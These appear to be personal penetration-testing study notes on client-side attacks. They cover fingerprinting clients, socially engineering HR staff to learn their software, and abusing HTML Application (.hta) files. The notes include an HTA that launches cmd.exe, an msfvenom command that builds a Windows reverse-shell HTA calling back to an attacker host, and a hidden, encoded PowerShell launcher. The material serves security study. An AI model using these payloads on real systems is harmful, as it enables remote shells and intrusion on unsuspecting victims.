---
title: Study Notes - 2021/03/21
date: 2021-03-21 02:01:55
tags: [Penetration Testing, Study Notes]
---

# Client-side Attack 

## Passive Client information Gathering  
Googled for various known external corporate IP addresses and found one on a site that hosts collected user agent data from various affiliate sites.

## Active Client information Gathering  
## Social engineering and client-side attacks 
Cheat HR, by sending their a document, and ask what types of os and broseswer they are using 

## Client Fingerprinting  
fingerpringjs  

use ajax to post components array to the server  

sudo chown www-data:www-data fp  

## Leveraging HTML Applications 
If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically nterpret it as a HTML Application and offer the ability to execute it using the mshta.exe program.

work with IE 

Similar to an HTML page, a typical HTML Application includes html, body, and script tags followed by JavaScript or VBScript code. However, since the HTML Application is executed outside the browser we are free to use legacy and dangerous features that are often blocked within the browser  

An additional window will open, add close 

``
<html>
<head>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
``

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```
```
iKqr8BWFyuiK.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg
```

-nop no profile  
-w hidden do not pop up a window  
-EncodedCommand  -e  

